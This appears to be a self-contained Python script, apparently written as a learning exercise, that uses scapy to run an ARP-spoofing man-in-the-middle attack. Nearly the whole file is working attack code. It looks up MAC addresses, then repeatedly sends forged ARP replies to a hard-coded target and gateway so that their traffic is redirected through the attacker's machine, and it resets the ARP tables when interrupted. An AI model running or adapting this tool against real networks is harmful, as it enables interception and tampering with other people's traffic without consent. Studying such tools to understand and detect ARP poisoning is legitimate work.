#! /usr/bin/env python3

'''
    Author: Andronikos Giachanatzis
    Date of latest update: 22-3-20
'''

import scapy.all as scapy
import time


'''
    Input: A string that contains the target IP (and possibly the mask for multiple targets)
    Function: It creates an ARP Request packet and an Broadcast Ethernet frame.
              It sends the packet(s) in the network, awaits for responses and receives responses from the target IP(s)
              It creates a list that contains the couples of IPs and MACs from the clients that replied
    Output: A list that contains the IPs and MACs of the clients that replied
'''
def getMac(ip):
    # build the ARP Request packet
    arp_request = scapy.ARP(pdst=ip)
    # build the broadcast ethernet frame that encapsulates the ARP packet
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # combine the ARP and the Ethernet objects into one object
    arp_request_broadcast = broadcast/arp_request

    # send and receive packets with custom ether parts. Wait 1 second for reply and move on
    #the srp function returns 2 lists: one containing the answers [0] and another containing the unanswered requests[1]
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    #create the list that contains only the IPs and MACs of the clients that answered the ARP Request
    clients_list = answered_list[0][1].hwsrc

    return clients_list


''' 
    Input: 2 IPs. One for the target IP, the client that we are gonna fake that we are going to be, and
           two for the Gateway (or the other client that we are gonna convince that we are the target client
    Function: Alters (or creates) an entry of the target client ARP table with a fake MAC. It fills the 
              client's ARP table with an entry stating that the IP address listed in the second parameter is 
              associated with the MAC of the current computer. After the ARP packet is created, it is sent 
              to the target client
    Output: -
'''
def spoof(target_ip, spoof_ip):
    ''' create the ARP reply packet for the target client
    use the IP of the target client as the destination IP and its MAC as its destination MAC
    say that its coming (this is the spoofing part) from the Router (not my IP) but keep my MAC
    as the source IP (leave it to default) in order to receive the packets sent to the router
    '''
    target_mac = getMac(target_ip)
    packet_for_client = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # send the packet
    scapy.send(packet_for_client, verbose=False)


''' 
    Input: 2 IPs. One for the client that we are going to restore its ARP table, the destination client
           and two, for the IP address that we are gonna restore its original MAC address association
    Function: Alters (or creates) an ARP entry in the destination client that restores the original MAC 
              address that was associated with the destination IP originally.
    Output: -
'''
def restore(dest_ip, src_ip):
    dest_mac=getMac(dest_ip)
    src_mac=getMac(src_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
    #
    scapy.send(packet, count=4, verbose=False)


target_ip = "10.0.3.5"
gateway_ip = "10.0.3.1"

sent_packets_count=0
try:
    while (True):
        # create the ARP reply packet for the target
        spoof(target_ip, gateway_ip)

        # create the ARP reply packet for the router
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2
        print("\r[+] Packets sent: " + str(sent_packets_count), end="")
        # create a delay before continuing
        time.sleep(2)
except (KeyboardInterrupt): #restore ARP entries and exit the program
        print("\n[!] Detected CTRL + C ...... Resetting ARP tables......Please wait")
        # restore the ARP table of the target IP with the correct MAC of the router
        restore(target_ip, gateway_ip)
        # restore the ARP table of the router with the correct MAC of the target IP
        restore(gateway_ip, target_ip)
        print("Exiting.")